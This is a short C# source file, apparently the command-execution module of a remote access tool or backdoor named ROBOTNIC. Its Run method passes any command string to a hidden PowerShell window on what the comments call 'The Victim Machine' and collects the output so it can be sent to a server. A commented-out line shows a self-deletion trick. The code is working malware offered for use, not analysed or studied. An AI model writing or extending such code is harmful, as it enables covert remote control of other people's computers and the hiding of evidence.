﻿using System;
using System.Diagnostics;

namespace ROBOTNIC
{
    internal class Commands
    {

        public static string Run(string cmdToRun)
        {
            try
            {
                string retString = "";
                // Making a New Object to Execute Our Commands
                Process processCmd = new Process();
                //Start Powershell on The Victim Machine
                processCmd.StartInfo.FileName = "powershell.exe";
                //--use /c as a cmd argument to close ps.exe once its finish processing your commands
                processCmd.StartInfo.Arguments = "/c " + cmdToRun;
                //for The Program To Delete Itself 
                // processCmd.StartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + cmdToRun;
                //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=net-6.0
                processCmd.StartInfo.UseShellExecute = false;
                //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.createnowindow?view=net-6.0
                // Hides The Window of The Process
                processCmd.StartInfo.CreateNoWindow = true;
                //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.workingdirectory?view=net-6.0
                processCmd.StartInfo.WorkingDirectory = Environment.CurrentDirectory;
                //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.redirectstandardoutput?view=net-6.0
                processCmd.StartInfo.RedirectStandardOutput = true;
                //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.redirectstandarderror?view=net-6.0
                processCmd.StartInfo.RedirectStandardError = true;
                //Start The Process
                processCmd.Start();
                //Sends The Output to Server
                retString += processCmd.StandardOutput.ReadToEnd();
                retString += processCmd.StandardError.ReadToEnd();

                return retString;
            }
            // Catch Error (Handler) 
            catch (Exception ex)
            {
                return ex.Message.ToString() + Environment.NewLine;
            }

        }
    }


}
